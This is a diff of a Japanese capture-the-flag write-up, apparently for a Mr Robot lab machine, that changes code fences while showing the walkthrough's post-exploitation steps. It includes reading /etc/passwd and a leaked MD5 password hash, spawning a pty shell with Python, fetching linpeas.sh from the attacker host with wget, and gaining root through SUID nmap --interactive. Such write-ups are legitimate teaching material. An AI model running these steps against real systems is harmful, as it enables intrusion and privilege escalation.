@@ -409,7 +409,7 @@ Kali にもともとある php のリバースシェルのスクリプトをコ�
 
 `cat /etc/passwd` で他にどのようなユーザがいるのか調べます。`robot` というユーザは問題名からしても気になりますね。
 
-```sh
+```console
 $ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -421,7 +421,7 @@ robot:x:1002:1002::/home/robot:
 
 robot に探りを入れてみると、2つ目の key を発見しました。しかし、key の参照権限はファイル所有者の robot しかないようです。
 
-```sh
+```console
 $ ls -l /home/robot/
 total 8
 -r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
@@ -430,7 +430,7 @@ total 8
 
 でも `password.raw-md5` という気になる名前をしたファイルは、その他のユーザにも参照権限があるようです。
 
-```sh
+```console
 $ cat /home/robot/password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
@@ -454,7 +454,7 @@ Session completed.
 
 robot ユーザでログインを試みます。が、terminal から実行してねと怒られました（シェルを取得した際にも、tty にアクセスできないと出てましたね）。
 
-```sh
+```console
 $ su - robot
 su: must be run from a terminal
 ```
@@ -462,7 +462,7 @@ su: must be run from a terminal
 そこで、ログインできるよう新たにシェルを立ちあげます。Python コマンドが実行できそうなので、以下のようにシェルを立ち上げるコマンドを実行します。その後またログインしてみると、 robot ユーザでログインに成功しました！
 これで `key-2-of-3.txt` もゲットできます。
 
-```sh
+```console
 $ python -c 'import pty; pty.spawn("/bin/sh")'
 $ su - robot
 su - robot
@@ -481,7 +481,7 @@ robot ユーザでのログインに成功したので、次は権限昇格を�
 
 robot では sudo でのコマンド実行はできないようです。
 
-```sh
+```console
 $ sudo -l
 sudo -l
 [sudo] password for robot:
@@ -501,7 +501,7 @@ Sorry, user robot may not run sudo on linux.
 
 `linpeas.sh` に実行権限を付与したら、これを実行して脆弱性を探してみます。
 
-```sh
+```console
 $ wget 10.4.108.90:12346/linpeas.sh
 wget 10.4.108.90:12346/linpeas.sh
 --2024-10-27 14:43:42--  http://10.4.108.90:12346/linpeas.sh
@@ -527,7 +527,7 @@ $ ./linpeas.sh | tee linpeas_output.txt
 「nmap SUID」と検索したら出てきた[こちらのサイト](https://gtfobins.github.io/gtfobins/nmap/)によると、バージョン 2.02～5.21 の間では、`nmap` には `--interactive` というオプションがあるようです。`nmap --interactive` を実行すると、root 権限のシェルにアクセスできるようです（恐ろしい！）
 シェルに入って、`!ls /root` を実行したら最後の key3-of-3.txt もゲットできました。Root 権限でのシェルも手に入れたので、これにて Room 攻略完了です！お疲れさまでした！！
 
-```sh
+```console
 $ nmap --interactive
 nmap --interactive
 
